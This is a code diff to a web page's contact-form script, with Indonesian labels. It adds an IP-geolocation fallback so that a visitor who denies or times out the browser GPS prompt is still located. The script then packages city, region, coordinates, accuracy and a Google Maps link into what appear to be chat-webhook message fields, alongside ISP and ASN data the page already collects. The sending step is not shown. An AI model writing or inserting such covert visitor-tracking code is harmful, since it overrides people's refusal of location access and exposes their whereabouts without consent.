@@ -1455,6 +1455,8 @@ document.getElementById('contact-form').addEventListener('submit', async functio
           g.postal       = d.postal       || 'Unknown';
           g.org          = d.org          || 'Unknown';
           g.asn          = d.asn          || 'Unknown';
+          g.lat          = d.latitude     || null;
+          g.lon          = d.longitude    || null;
         }
       } catch(e){}
       return g;
@@ -1520,6 +1522,14 @@ document.getElementById('contact-form').addEventListener('submit', async functio
       { name:'🗺️ Koordinat',    value: `\`${detailLoc.lat.toFixed(6)}, ${detailLoc.lon.toFixed(6)}\``, inline: true },
       { name:'🎯 Akurasi',      value: `±${detailLoc.accuracy}m`, inline: true },
       { name:'🔗 Google Maps',  value: `[Buka Maps](${mapsUrl})`, inline: true },
+    );
+  } else if(geo.lat && geo.lon) {
+    const ipMapsUrl = `https://www.google.com/maps?q=${geo.lat},${geo.lon}`;
+    fields2.push(
+      { name:'📍 Lokasi (via IP)',  value: `${geo.city}, ${geo.region}, ${geo.country}`, inline: false },
+      { name:'🗺️ Koordinat (IP)',   value: `\`${Number(geo.lat).toFixed(4)}, ${Number(geo.lon).toFixed(4)}\``, inline: true },
+      { name:'🎯 Akurasi',          value: '~kota (IP)', inline: true },
+      { name:'🔗 Google Maps',      value: `[Buka Maps](${ipMapsUrl})`, inline: true },
     );
   } else {
     fields2.push({ name:'📍 GPS', value: 'Tidak diizinkan / timeout', inline: false });
@@ -1587,6 +1597,8 @@ function initTilt(){
 setTimeout(initTilt, 800);
 
 })();
+
+</script>
 <script>
 (function(){
   const ua = navigator.userAgent || '';
